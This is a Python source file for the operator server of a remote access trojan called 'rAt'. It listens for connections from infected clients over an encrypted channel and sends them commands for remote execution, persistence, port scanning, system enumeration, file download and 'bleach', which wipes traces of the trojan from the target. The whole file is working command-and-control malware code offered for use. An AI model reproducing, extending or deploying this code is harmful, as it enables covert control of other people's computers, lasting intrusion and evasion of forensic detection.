#!/usr/bin/env python

# rAt server

import argparse
import readline
import socket
import sys
import threading
from core.crypto import encrypt, decrypt, diffiehellman

BANNER = '''

     _____________________________________________/\/\______/\/\/\/\/\/\_____________________________
    _____________________________/\/\__/\/\____/\/\/\/\________/\/\_________________________________ 
   _____________________________/\/\/\/\____/\/\____/\/\______/\/\_________________________________  
  _____________________________/\/\________/\/\/\/\/\/\______/\/\_________________________________   
 _____________________________/\/\________/\/\____/\/\______/\/\_________________________________    
_/\/\/\/\/\/\__/\/\/\/\/\/\__________________________________________/\/\/\/\/\/\__/\/\/\/\/\/\_     

'''
client_commands = [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'scan',
                    'bleach', 'enum', 'unzip', 'wget' ]
HELP_TEXT = '''command             | description
---------------------------------------------------------------------------
cat <file>          | output a file
client <id>         | connect to a client
clients             | list connected clients
execute <command>   | execute a command on the target
bye                 | exit the server and destroy all clients
help                | show help menu
kill                | kill client connection
ls                  | list files in the current directory
persistence         | apply persistence mechanism
pwd                 | get the present working directory
quit                | exit the server and keep all clients alive
scan <ip>           | scan top 25 TCP ports on a single host
bleach              | sanitize target system + remove all traces of rAt
enum                | enumerate the system
unzip <file>        | unzip file
wget <url>          | download file from internet'''

class Server(threading.Thread):
    def __init__(self, port):
        super().__init__()
        self.server_socket = self._setup_server_socket(port)
        self.clients = {}
        self.client_count = 1
        self.current_client = None

    @staticmethod
    def _setup_server_socket(port):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', port))
        server_socket.listen(5)
        return server_socket

    def run(self):
        while True:
            conn, addr = self.server_socket.accept()
            dhkey = diffiehellman(conn)
            client_id = self.client_count
            self.clients[client_id] = ClientConnection(conn, addr, dhkey, uid=client_id)
            self.client_count += 1

    def send_client(self, message, client):
        if client is None:
            print('[!] no client selected (or client disconnected) [!]') # ensure object is not None before proceeding
            return
        try:
            encrypted_message = encrypt(message, client.dhkey)
            client.conn.send(encrypted_message)
        except Exception as e:
            print(f'error: {e}')

    def recv_client(self, client):
        if client is None:
            print('[!] no client selected (or client disconnected) [!]') # ensure object is not None before proceeding
            return
        try:
            received_data = client.conn.recv(4096)
            print(decrypt(received_data, client.dhkey))
        except Exception as e:
            print(f'error: {e}')

    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)]
            print(f'client {client_id} selected.')
        except (KeyError, ValueError):
            print('error: invalid client ID')

    def remove_client(self, key):
        return self.clients.pop(key, None)

    def kill_client(self, _):
        if self.current_client is None:
            print('[!] no client selected [!]') # check against server's current state
        self.send_client('kill', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def bleach_client(self, _):
        if self.current_client is None:
            print('[!] no client selected [!]') # check against server's current state
        self.send_client('bleach', self.current_client)
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def get_clients(self):
        return [v for _, v in self.clients.items()]

    def list_clients(self, _):
        print('ID | client address\n-------------------')
        for k, v in self.clients.items():
            print('{:>2} | {}'.format(k, v.addr[0]))

    def quit_server(self, _):
        if input('exit server and keep all clients alive (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('quit', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def bye_server(self, _):
        if input('exit server and destroy all clients (y/N)? ').startswith('y'):
            for c in self.get_clients():
                self.send_client('bleach', c)
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()
            sys.exit(0)

    def print_help(self, _):
        print(HELP_TEXT)

class ClientConnection:
    def __init__(self, conn, addr, dhkey, uid=0):
        self.conn = conn
        self.addr = addr
        self.dhkey = dhkey
        self.uid = uid

def get_parser():
    parser = argparse.ArgumentParser(description='rAt server')
    parser.add_argument('-p', '--port', help='port to listen on.', default=2222, type=int)
    return parser

def main():
    parser = get_parser()
    args = parser.parse_args()
    port = args.port

    print(BANNER) # start server
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print(f'rAt listening for connections on port {port}.')

    # server side commands
    server_commands = {
        'client':       server.select_client,
        'clients':      server.list_clients,
        'bye':          server.bye_server,
        'help':         server.print_help,
        'kill':         server.kill_client,
        'quit':         server.quit_server,
        'bleach':       server.bleach_client
    }

    def completer(text, state):
        commands = client_commands + [k for k, _ in server_commands.items()]

        options = [i for i in commands if i.startswith(text)]
        if state < len(options):
            return options[state] + ' '
        else:
            return None

    # turn tab completion on
    readline.parse_and_bind('tab: complete')
    readline.set_completer(completer)

    while True:
        # display prompt
        if server.current_client:
            ccid = server.current_client.uid
        else:
            ccid = '?'

        prompt = input('\n[{}] rAt> '.format(ccid)).rstrip()

        # skip if no input (nop)
        if not prompt:
            continue

        # seperate prompt into command and action
        cmd, _, action = prompt.partition(' ')

        if cmd in server_commands: # handle server commands
            server_commands[cmd](action)

        elif cmd in client_commands:
            if server.current_client is None: # check if client is selected
                print('[!] no client selected [!]')
                continue

            print(f'running {cmd}...')
            server.send_client(prompt, server.current_client)
            server.recv_client(server.current_client)

        else:
            print('invalid command, type "help" to see a list of commands.')

if __name__ == '__main__':
    main()
